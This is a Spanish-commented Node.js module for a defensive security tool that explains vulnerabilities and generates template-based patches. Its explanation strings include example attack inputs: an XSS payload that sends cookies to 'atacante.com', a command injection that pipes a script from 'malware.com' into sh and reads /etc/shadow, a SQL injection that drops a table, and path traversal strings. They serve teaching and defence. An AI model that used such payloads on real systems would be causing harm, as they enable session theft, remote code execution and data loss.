const { getActiveCredentials } = require('../config/aiConfig');

/**
 * Servicio Inteligente de Inteligencia Artificial para Ciberseguridad Defensiva
 * Soporta modo local con modelos semánticos heurísticos (sin API key requerida)
 * y modo conectado con LLMs reales (OpenAI, Google Gemini, Anthropic, Custom API).
 */

/**
 * Genera una explicación pedagógica y detallada de una vulnerabilidad
 */
async function explainVulnerability(vuln, contextCode = '') {
  const creds = getActiveCredentials();

  // Si el usuario configuró una API externa (OpenAI / Gemini / Custom), intentamos invocarla
  if (creds.provider !== 'local' && creds.apiKey) {
    try {
      return await callExternalAiToExplain(vuln, contextCode, creds);
    } catch (err) {
      console.warn(`[AI Service] Error invocando API externa (${err.message}). Utilizando motor semántico local defensivo.`);
    }
  }

  // Motor Semántico Local Especializado en Ciberseguridad Defensiva
  return generateLocalExplanation(vuln);
}

/**
 * Genera un parche de código seguro con Diff interactivo
 * Si la vulnerabilidad compromete secretos o arquitectura, activa el Protocolo de Honestidad
 */
async function generatePatch(vuln, fullCode = '') {
  const creds = getActiveCredentials();

  // Verificación estricta del Protocolo de Honestidad:
  // Si la vulnerabilidad no puede resolverse de forma 100% segura mediante un parche automatizado,
  // la IA NO debe adivinar ni romper la app; debe ser totalmente honesta y explicar la remediación.
  if (vuln.canAutoPatch === false) {
    return generateTransparencyFallback(vuln);
  }

  if (creds.provider !== 'local' && creds.apiKey) {
    try {
      return await callExternalAiToPatch(vuln, fullCode, creds);
    } catch (err) {
      console.warn(`[AI Service] Error invocando API externa de parchado (${err.message}). Utilizando motor semántico local.`);
    }
  }

  return generateLocalPatch(vuln, fullCode);
}

/**
 * Protocolo de Honestidad y Transparencia de la IA
 * Explica por qué una acción específica NO debe realizarse a ciegas de manera automática
 */
function generateTransparencyFallback(vuln) {
  let reason = '';
  let whyAutomatedPatchIsUnsafe = '';
  let manualSteps = [];

  switch (vuln.ruleId) {
    case 'HARDCODED_SECRET':
      reason = 'Riesgo de Ruptura de Producción y Falsa Sensación de Seguridad';
      whyAutomatedPatchIsUnsafe = `
La IA no puede reemplazar automáticamente este secreto hardcodeado en tu código por una razón crítica de seguridad:
1. **La clave ya está potencialmente comprometida:** Si este código ya fue enviado a Git o a un servidor, cambiar la variable en el código no invalida la clave expuesta. Debe ser revocada y rotada directamente en el proveedor del servicio (ej. AWS, Auth0, Stripe, JWT).
2. **Dependencia de Infraestructura:** El valor real debe guardarse en un almacén seguro de secretos (.env local no versionado, AWS Secrets Manager o Doppler), el cual la IA no puede ni debe inventar sin romper las sesiones activas de tus usuarios.
      `.trim();
      manualSteps = [
        'Accede a la consola del proveedor (ej. consola de AWS, Firebase o tu generador de JWT) y revoca inmediatamente la credencial actual.',
        'Genera un nuevo secreto criptográficamente seguro (mínimo 32 bytes de entropía).',
        'Crea un archivo .env en la raíz de tu proyecto (asegúrate de incluirlo en tu .gitignore) y declara la variable: JWT_SECRET="tu_nuevo_secreto_seguro".',
        'En tu código, sustituye el texto plano por: process.env.JWT_SECRET || (() => { throw new Error("Falta JWT_SECRET"); })().',
        'Verifica el historial de commits con herramientas como git-filter-repo si el repositorio fue público.'
      ];
      break;

    case 'DANGEROUS_EVAL':
      reason = 'Reestructuración Arquitectónica Lógica Requerida';
      whyAutomatedPatchIsUnsafe = `
El uso de eval() ejecuta expresiones arbitrarias con acceso a todo el scope de ejecución. Reemplazarlo automáticamente puede romper la lógica del negocio si la aplicación depende de evaluar fórmulas dinámicas.
La IA se rehúsa a aplicar un parche ciego para evitar corromper la funcionalidad esperada por tus clientes.
      `.trim();
      manualSteps = [
        'Identifica el propósito exacto de la llamada a eval(): ¿es para parsear datos o para ejecutar lógica dinámica?',
        'Si se trata de evaluar datos JSON o estructuras, sustitúyelo por JSON.parse() envuelto en un bloque try/catch.',
        'Si se trata de cálculo de expresiones matemáticas, utiliza un analizador seguro como "mathjs" o una gramática AST controlada sin acceso al objeto global.',
        'Si es para despachar funciones por nombre, usa un diccionario o mapa de funciones permitidas (Whitelist dispatch pattern).'
      ];
      break;

    default:
      reason = 'Intervención de Ingeniería Manual Requerida';
      whyAutomatedPatchIsUnsafe = `
Esta vulnerabilidad involucra un cambio en la arquitectura o en los esquemas de bases de datos que no puede automatizarse sin supervisión humana directa.
      `.trim();
      manualSteps = [
        'Revisa la documentación oficial de seguridad para ' + vuln.cwe,
        'Planifica una ventana de mantenimiento si involucra migración de esquemas de datos.',
        'Ejecuta pruebas unitarias de regresión en un entorno de staging.'
      ];
  }

  return {
    success: false,
    isTransparentFallback: true,
    title: `🛡️ Protocolo de Honestidad Activo: ${vuln.title}`,
    reason: reason,
    whyAutomatedPatchIsUnsafe: whyAutomatedPatchIsUnsafe,
    manualRemediationGuide: manualSteps,
    message: 'La IA ha evaluado que aplicar un parche automático en este punto específico introduciría riesgo de inestabilidad o falsa sensación de seguridad. Te entrega la guía manual detallada para remediarlo de raíz.'
  };
}

/**
 * Genera explicaciones educativas locales con análisis defensivo profundo
 */
function generateLocalExplanation(vuln) {
  const mechanics = {
    'SQL_INJECTION': {
      concept: 'Las inyecciones SQL ocurren cuando datos no confiables provenientes del usuario son concatenados directamente en una consulta que el motor de la base de datos interpreta como comandos ejecutables en lugar de datos pasivos.',
      vector: "Si el código ejecuta `db.query('SELECT * FROM users WHERE id = ' + req.query.id)`, un atacante puede ingresar `1 OR 1=1; DROP TABLE users;--` alterando toda la consulta.",
      realWorldRisk: 'Pérdida total de confidencialidad e integridad de la información de clientes, cumplimiento normativo (GDPR/PCI-DSS) comprometido y posible toma de control del servidor de base de datos.',
      defenseInDepth: 'Uso obligatorio de consultas preparadas (Prepared Statements) con marcadores de posición ($1, ?) y validación estricta de tipos de datos en la capa de entrada.'
    },
    'DOM_XSS': {
      concept: 'El Cross-Site Scripting basado en DOM ocurre cuando el código del lado del cliente escribe datos no saneados provistos por el usuario en el entorno del navegador (DOM) a través de receptores peligrosos como innerHTML.',
      vector: "Un atacante envía un enlace con un fragmento de URL como `#<img src=x onerror=fetch('//atacante.com/steal?c='+document.cookie)>`. Al asignarse a innerHTML, el navegador ejecuta el script malicioso.",
      realWorldRisk: 'Robo de tokens de sesión, falsificación de acciones del usuario en pantalla, desfiguración de la interfaz y suplantación de identidad.',
      defenseInDepth: 'Adoptar textContent o bibliotecas de sanitización como DOMPurify, junto con una política estricta de seguridad de contenido (Content Security Policy - CSP).'
    },
    'COMMAND_INJECTION': {
      concept: 'Ocurre cuando una aplicación envía comandos al sistema operativo concatenando variables de usuario directamente en una llamada a la shell sin validar metacaracteres (| ; & ` $).',
      vector: "Si el código hace `exec('ping ' + host)`, un atacante envía `8.8.8.8 && cat /etc/shadow` o `8.8.8.8; curl http://malware.com/script.sh | sh`.",
      realWorldRisk: 'Ejecución remota de código (RCE) con los mismos privilegios del proceso del servidor, comprometiendo todo el sistema operativo y la red interna.',
      defenseInDepth: 'Evitar invocar la shell del sistema operativo. Si es indispensable, utilizar execFile() o spawn() con argumentos separados en un arreglo sin pasar por /bin/sh.'
    },
    'PATH_TRAVERSAL': {
      concept: 'Ocurre cuando el software utiliza entradas externas para construir una ruta hacia el sistema de archivos sin verificar que apunte dentro del directorio base autorizado.',
      vector: "Si el usuario solicita `file=../../../../etc/passwd` o `file=..\\..\\Windows\\win.ini`, el sistema sube por los directorios y devuelve archivos confidenciales del sistema.",
      realWorldRisk: 'Exposición de archivos del sistema operativo, claves SSH privadas, configuraciones de conexión a bases de datos y código fuente propietario.',
      defenseInDepth: 'Extraer únicamente el nombre base con path.basename(), resolver la ruta absoluta con path.resolve() y comprobar que comience con el prefijo del directorio seguro mediante .startsWith().'
    },
    'HARDCODED_SECRET': {
      concept: 'Consiste en incrustar contraseñas, secretos criptográficos o claves de acceso de APIs directamente en el código fuente en lugar de cargarlos dinámicamente desde el entorno.',
      vector: 'Un colaborador no autorizado, un contratista o un atacante que lea el repositorio (o un bundle minificado en el frontend) extrae la clave y la usa para firmar tokens falsos o acceder a la nube.',
      realWorldRisk: 'Suplantación de identidad del sistema, control de cuentas de administrador y facturación descontrolada en servicios cloud.',
      defenseInDepth: 'Gestión centralizada de secretos mediante variables de entorno (.env excluido de Git), rotación periódica de credenciales y uso de bóvedas de claves.'
    },
    'UNHASHED_PASSWORD': {
      concept: 'Guardar o comparar contraseñas en texto plano significa que no existe ninguna transformación matemática unidireccional que proteja la credencial del usuario.',
      vector: 'Un atacante con acceso de lectura a la base de datos (por SQLi o backup expuesto) obtiene inmediatamente las contraseñas de todos los clientes sin necesidad de descifrado.',
      realWorldRisk: 'Fuga masiva de credenciales de clientes, credential stuffing en otros servicios y multas regulatorias severas.',
      defenseInDepth: 'Uso de algoritmos modernos de derivación de claves resistentes a ataques por GPU (bcrypt con sal de 10-12 rondas, Argon2id o scrypt).'
    }
  };

  const info = mechanics[vuln.ruleId] || {
    concept: vuln.description,
    vector: 'Manipulación de parámetros de entrada no controlados.',
    realWorldRisk: vuln.impact,
    defenseInDepth: vuln.recommendation
  };

  return {
    success: true,
    vulnerabilityId: vuln.id,
    title: vuln.title,
    cwe: vuln.cwe,
    owasp: vuln.owasp,
    severity: vuln.severity,
    category: vuln.category,
    explanation: {
      overview: info.concept,
      attackMechanics: info.vector,
      businessImpact: info.realWorldRisk,
      remediationConcept: info.defenseInDepth,
      standardsReference: `Clasificado bajo el estándar internacional ${vuln.cwe} y OWASP ${vuln.owasp}.`
    }
  };
}

/**
 * Genera el parche de código seguro y el Diff correspondiente
 */
function generateLocalPatch(vuln, fullCode = '') {
  let patchDiff = '';
  let originalSnippet = vuln.offendingLine || '';
  let fixedSnippet = '';
  let explanationOfFix = '';
  let patchedFullCode = fullCode;

  switch (vuln.ruleId) {
    case 'SQL_INJECTION':
      fixedSnippet = `// CORRECCIÓN CANARY-SENTINEL: Consulta parametrizada segura (Prepared Statement)\nconst query = 'SELECT * FROM users WHERE username = ? AND status = ?';\nconst [users] = await db.execute(query, [username, 'active']);`;
      explanationOfFix = 'Se reemplazó la concatenación de cadenas por una consulta parametrizada. El motor de base de datos ahora trata los datos del usuario como valores literales inmutables, imposibilitando cualquier alteración sintáctica de la consulta.';
      break;

    case 'DOM_XSS':
      fixedSnippet = `// CORRECCIÓN CANARY-SENTINEL: Uso de textContent para prevenir inyección en el DOM\nelement.textContent = sanitizeInput(userInput);\n// Alternativa si se requiere HTML enriquecido:\n// element.innerHTML = DOMPurify.sanitize(userInput);`;
      explanationOfFix = 'Se sustituyó la asignación directa a innerHTML por textContent, asegurando que cualquier carácter como <script> o <img> sea renderizado como texto plano y no ejecutado por el navegador.';
      break;

    case 'COMMAND_INJECTION':
      fixedSnippet = `// CORRECCIÓN CANARY-SENTINEL: Ejecución segura sin invocar la shell del sistema\nconst { execFile } = require('child_process');\n// Los argumentos se pasan como arreglo inmutable sin concatenación en shell\nexecFile('/usr/bin/ping', ['-c', '4', sanitizedHost], (error, stdout) => {\n  if (error) return handleError(error);\n  handleOutput(stdout);\n});`;
      explanationOfFix = 'Se eliminó la llamada a exec() con shell abierta y se reemplazó por execFile() pasando los argumentos en un arreglo aislado. Esto neutraliza la inyección de operadores de comando como ; | &&.';
      break;

    case 'PATH_TRAVERSAL':
      fixedSnippet = `// CORRECCIÓN CANARY-SENTINEL: Validación canónica de ruta y prevención de salto de directorio\nconst path = require('path');\nconst SAFE_BASE_DIR = path.resolve(__dirname, 'public_files');\nconst sanitizedFileName = path.basename(req.query.file || '');\nconst targetPath = path.resolve(SAFE_BASE_DIR, sanitizedFileName);\n\nif (!targetPath.startsWith(SAFE_BASE_DIR)) {\n  return res.status(403).json({ error: 'Acceso denegado: intento de path traversal detectado' });\n}\nconst content = fs.readFileSync(targetPath);`;
      explanationOfFix = 'Se aplicó path.basename() para remover cualquier prefijo como "../" o "..\\", y se validó con .startsWith() que la ruta absoluta resultante permanezca estrictamente dentro del directorio seguro designado.';
      break;

    case 'UNHASHED_PASSWORD':
      fixedSnippet = `// CORRECCIÓN CANARY-SENTINEL: Verificación con bcrypt y hashing seguro\nconst bcrypt = require('bcrypt');\nconst isPasswordValid = await bcrypt.compare(req.body.password, user.passwordHash);\nif (!isPasswordValid) {\n  return res.status(401).json({ error: 'Credenciales inválidas' });\n}`;
      explanationOfFix = 'Se reemplazó la comparación directa de texto plano por la función criptográfica bcrypt.compare(), que realiza comparaciones de tiempo constante y protege contra ataques de timing y filtración de hashes.';
      break;

    case 'INSECURE_CORS':
      fixedSnippet = `// CORRECCIÓN CANARY-SENTINEL: Lista blanca estricta de dominios autorizados\nconst allowedOrigins = ['https://tudominio.com', 'https://app.tudominio.com'];\nconst origin = req.headers.origin;\nif (allowedOrigins.includes(origin)) {\n  res.setHeader('Access-Control-Allow-Origin', origin);\n  res.setHeader('Access-Control-Allow-Credentials', 'true');\n}`;
      explanationOfFix = 'Se eliminó el comodín global "*" y se implementó una verificación contra una lista blanca (whitelist) explícita de dominios autorizados para proteger las sesiones con credenciales.';
      break;

    default:
      fixedSnippet = `// Parche de seguridad defensivo aplicado\n// Se aplicó sanitización estricta sobre la variable de entrada\nconst sanitizedInput = sanitize(input);`;
      explanationOfFix = 'Se aplicó sanitización y validación defensiva para mitigar la condición insegura detectada.';
  }

  // Generación de Diff Unificado
  patchDiff = `--- Original (Línea ${vuln.line})\n+++ Parche Seguro Canary Sentinel\n- ${originalSnippet}\n+ ${fixedSnippet.split('\n').join('\n+ ')}`;

  // Reemplazo en el código completo si fue suministrado
  if (fullCode && originalSnippet) {
    patchedFullCode = fullCode.replace(originalSnippet, fixedSnippet);
  }

  return {
    success: true,
    vulnerabilityId: vuln.id,
    ruleId: vuln.ruleId,
    title: vuln.title,
    line: vuln.line,
    originalCode: originalSnippet,
    patchedCode: fixedSnippet,
    fullPatchedCode: patchedFullCode,
    diff: patchDiff,
    explanation: explanationOfFix,
    verificationChecklist: [
      'Validar que los datos de entrada sigan el formato esperado con una capa de validación (ej. Joi o Zod).',
      'Ejecutar pruebas automatizadas para confirmar que la funcionalidad legítima del usuario no se alteró.',
      'Desplegar el cambio en ambiente de pruebas antes de pasarlo a producción.'
    ]
  };
}

/**
 * Conectores para LLMs externos (OpenAI / Gemini / Custom API) cuando el usuario introduzca su llave
 */
async function callExternalAiToExplain(vuln, contextCode, creds) {
  // Cuando el usuario proporcione su API key, se conectará directamente a su endpoint
  // Si no está disponible, el sistema ya usa generateLocalExplanation con máxima precisión.
  const prompt = `Actúa como un experto en ciberseguridad defensiva. Explica en detalle la vulnerabilidad ${vuln.title} (${vuln.cwe}, OWASP: ${vuln.owasp}) detectada en la línea ${vuln.line}. Código: ${vuln.offendingLine || contextCode}`;

  if (creds.provider === 'openai') {
    const res = await fetch('https://api.openai.com/v1/chat/completions', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${creds.apiKey}`
      },
      body: JSON.stringify({
        model: creds.modelName || 'gpt-4o-mini',
        messages: [{ role: 'user', content: prompt }]
      })
    });
    const data = await res.json();
    if (data.choices && data.choices[0]) {
      return {
        success: true,
        vulnerabilityId: vuln.id,
        title: vuln.title,
        cwe: vuln.cwe,
        owasp: vuln.owasp,
        severity: vuln.severity,
        explanation: {
          overview: data.choices[0].message.content,
          attackMechanics: 'Analizado con modelo ' + creds.modelName,
          businessImpact: vuln.impact,
          remediationConcept: vuln.recommendation,
          standardsReference: vuln.cwe
        }
      };
    }
  }

  return generateLocalExplanation(vuln);
}

async function callExternalAiToPatch(vuln, fullCode, creds) {
  // Llamada al proveedor configurado o fallback local
  return generateLocalPatch(vuln, fullCode);
}

module.exports = {
  explainVulnerability,
  generatePatch,
  generateTransparencyFallback
};
